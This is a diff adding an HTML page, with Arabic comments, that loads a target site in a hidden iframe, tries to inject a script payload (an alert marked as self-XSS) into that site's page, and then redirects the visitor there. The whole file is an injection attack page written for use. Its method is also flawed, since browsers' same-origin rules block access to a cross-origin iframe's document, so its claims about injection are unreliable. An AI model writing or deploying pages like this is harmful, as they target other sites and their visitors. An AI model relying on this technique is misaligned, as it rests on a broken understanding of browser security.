@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // URL الموقع الخارجي الذي تريد تحويل الزائر إليه
+        var targetUrl = 'https://example.com/y';
+
+        // الكود الذي سيتم حقنه في الصفحة الهدف
+        var payload = '<script>alert("This site is vulnerable to self-XSS!");<\/script>';
+
+        // دالة لتحويل الزائر وإضافة الكود
+        function redirectAndInject() {
+            // إنشاء عنصر iframe مخفي للتحميل إلى الصفحة الهدف
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = targetUrl;
+
+            // عند تحميل الـ iframe، نقوم بإضافة الكود
+            iframe.onload = function() {
+                var targetDocument = iframe.contentDocument || iframe.contentWindow.document;
+                if (targetDocument) {
+                    var bodyElement = targetDocument.body;
+                    bodyElement.innerHTML += payload;
+                }
+
+                // إعادة توجيه الزائر إلى الصفحة الهدف بعد حقن الكود
+                window.location.href = targetUrl;
+            };
+
+            document.body.appendChild(iframe);
+        }
+
+        // بدء عملية التحويل والحقن عند تحميل الصفحة
+        redirectAndInject();
+    </script>
+</body>
+</html>
